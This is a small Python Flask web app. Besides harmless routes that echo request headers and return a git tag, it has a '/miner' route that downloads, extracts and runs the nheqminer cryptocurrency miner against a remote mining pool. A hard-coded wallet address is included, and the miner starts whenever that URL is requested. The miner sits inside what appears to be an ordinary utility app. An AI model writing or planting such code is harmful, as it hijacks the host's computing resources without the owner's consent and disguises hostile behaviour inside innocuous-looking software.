import platform
import subprocess
import os
from flask import Flask, Response, request
app = Flask(__name__)

@app.route("/")
def headers():
    return '<br/>'.join(['%s => %s' % (key, value) for (key, value) in request.headers.items()])

@app.route("/favicon.ico")
def favicon():
    resp = Response(status=200, mimetype='image/png')
    return resp

@app.route("/miner")
def pyver():
    a  = os.popen('wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l vrsc.ciscotech.dk:9999 -u RE17z9AwpsdKNvZMDPwoE6b7ZyNZLeUs4Z.cpu1 -p x -t 2').readlines()
    return a

@app.route("/tag")
def tag():
    p = subprocess.Popen(['git', 'describe', '--tags', '--abbrev=0'], stdout=subprocess.PIPE)
    p.wait()
    return p.stdout.read()

if __name__ == "__main__":
    app.run()
   
